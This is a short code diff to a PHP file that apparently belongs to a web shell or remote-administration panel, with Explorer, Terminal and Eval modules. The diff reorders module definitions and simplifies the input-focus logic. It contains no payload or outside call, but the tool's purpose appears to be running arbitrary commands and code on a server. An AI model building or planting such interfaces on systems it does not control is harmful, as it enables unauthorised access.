@@ -47,27 +47,28 @@ if(isset($p['viewEntry'])){
 }
 else $explorer_content = show_all_files(get_cwd());
 
-$GLOBALS['module']['explorer']['id'] = "explorer";
-$GLOBALS['module']['explorer']['title'] = "Explorer";
-$GLOBALS['module']['explorer']['js_ontabselected'] = "";
 if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
     $nav = convert_encode($GLOBALS['encode'], 'utf-8', $nav);
     $cwd = convert_encode($GLOBALS['encode'], 'utf-8', $cwd);
     $explorer_content = convert_encode($GLOBALS['encode'], 'utf-8', $explorer_content);
 }
+
+$GLOBALS['module']['explorer']['id'] = "explorer";
+$GLOBALS['module']['explorer']['title'] = "Explorer";
+$GLOBALS['module']['explorer']['js_ontabselected'] = "";
 $GLOBALS['module']['explorer']['content'] = $explorer_content;
 
 $GLOBALS['module']['terminal']['id'] = "terminal";
 $GLOBALS['module']['terminal']['title'] = "Terminal";
 $GLOBALS['module']['terminal']['js_ontabselected'] = "
-if((!portableMode) && ($('#terminalOutput').html()=='')) $('#terminalInput').focus();";
+if(!portableMode) $('#terminalInput').focus();";
 $GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>".$cwd."&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>";
 
 
 $GLOBALS['module']['eval']['id'] = "eval";
 $GLOBALS['module']['eval']['title'] = "Eval";
 $GLOBALS['module']['eval']['js_ontabselected'] = "
-if((!portableMode) && ($('#evalOutput').html()=='You can also press ctrl+enter to submit')) $('#evalInput').focus();";
+if(!portableMode) $('#evalInput').focus();";
 $GLOBALS['module']['eval']['content'] = "
 <table class='boxtbl'>
 <thead>
